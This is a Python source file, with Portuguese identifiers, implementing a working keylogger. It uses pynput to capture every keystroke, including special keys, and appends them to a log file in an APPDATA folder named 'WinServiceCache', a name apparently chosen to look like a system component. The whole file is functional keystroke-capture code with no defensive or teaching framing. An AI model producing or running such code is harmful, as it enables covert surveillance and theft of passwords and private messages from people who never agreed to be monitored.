import os
import threading
from pathlib import Path
from pynput import keyboard
from datetime import datetime

class KeyLogger:
    def __init__(self, buffer_limit=50):
        self.caminho_cache = Path(os.getenv('APPDATA')) / "WinServiceCache"
        self.caminho_cache.mkdir(parents=True, exist_ok=True)
        self.arquivo_log = self.caminho_cache / "text.txt"
        self.buffer = []
        self.buffer_limit = buffer_limit
        self.lock = threading.Lock()

    def _get_timestamp(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def salvar_no_arquivo(self):
        if not self.buffer:
            return
        
        with self.lock:
            conteudo = "".join(self.buffer)
            self.buffer.clear()

        try:
            with open(self.arquivo_log, "a", encoding="utf-8") as f:
                f.write(conteudo)
        except IOError as e:
            print(f"Erro ao salvar arquivo: {e}")

    def processar_tecla(self, key):
        tecla_formatada = ""
        
        try:
            tecla_formatada = key.char
            if key.char is None:
                raise AttributeError
        except AttributeError:
            if key == keyboard.Key.space:
                tecla_formatada = " "
            elif key == keyboard.Key.enter:
                tecla_formatada = "\n"
            elif key == keyboard.Key.tab:
                tecla_formatada = "\t"
            elif key == keyboard.Key.backspace:
                with self.lock:
                    if self.buffer:
                        self.buffer.pop()
                return
            else:
                nome_tecla = str(key).replace("Key.", "").upper()
                tecla_formatada = f"[{nome_tecla}]"

        with self.lock:
            self.buffer.append(tecla_formatada)

    def on_press(self, key):
        self.processar_tecla(key)
        with self.lock:
            tamanho_atual = len(self.buffer)

        if tamanho_atual >= self.buffer_limit:
            self.salvar_no_arquivo()

    def start(self):
        print(f"Logger iniciado. Salvando em: {self.arquivo_log}")
        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                self.salvar_no_arquivo()
                print("\nLogger finalizado.")

if __name__ == "__main__":
    logger = KeyLogger(buffer_limit=100) 
    logger.start()